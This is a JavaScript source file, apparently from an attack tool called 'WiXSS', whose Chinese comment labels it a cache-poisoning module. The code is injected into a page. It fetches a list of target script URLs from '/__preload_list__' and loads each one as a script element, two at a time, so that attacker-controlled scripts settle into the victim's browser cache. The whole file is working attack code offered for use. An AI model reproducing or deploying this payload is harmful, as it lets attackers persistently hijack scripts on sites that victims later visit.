/** @define {boolean} */
var _DEBUG = true;

(function() {
	if (self != top) return;
	if (Math.LN == 0) return;
	Math.LN = 0;




	//========== 缓存投毒模块 ==========
	var head = document.getElementsByTagName('head')[0];
	var targets = [];
	var thread = 2;
	var startTime;
	var poisoning = {
		callback: handleLoaded,
		map: {}
	};

	Math.sin['poisoning'] = poisoning;


	function handleLoaded(url) {
		var el = poisoning.map[url];
		if (el) {
			el.parentNode.removeChild(el);
			setTimeout(loadNext, 1);
		}
	}

	function loadJs(url) {
		var spt = document.createElement('script');

		// 记录该 URL 对应的脚本元素
		poisoning.map[url] = spt;
		spt.src = url;
		head.appendChild(spt);
	}

	var index;

	function loadNext() {
		if (--index < 0) {
			if (index == -1) {
				targets = null;
				if (_DEBUG) {
					console.warn('[WiXSS] poisoning done! ' +
						(+new Date - startTime) + 'ms'
					);
				}
			}
		}
		else {
			loadJs( targets[index] );
		}
	}

	function handleListLoaded(data) {

		targets = data.split('\t');
		index = targets.length;

		if (_DEBUG) {
			console.warn('[WiXSS] poisoning ' + targets.length + ' targets');
			startTime = +new Date;
		}

		for(var i = 0; i < thread; i++) {
			loadNext();
		}
	}

	function pull() {
		var xhr = new XMLHttpRequest;
		xhr.open('GET', '/__preload_list__', true);
		xhr.onreadystatechange = function() {
			if (this.readyState == 4) {
				handleListLoaded(this.responseText);
			}
		};
		xhr.send();
	}

	function init() {
		if (_DEBUG) {
			console.warn('[WiXSS] pulling preload list');
		}
		pull();
	}
	init();


//	loadModule('/?!preload');

})();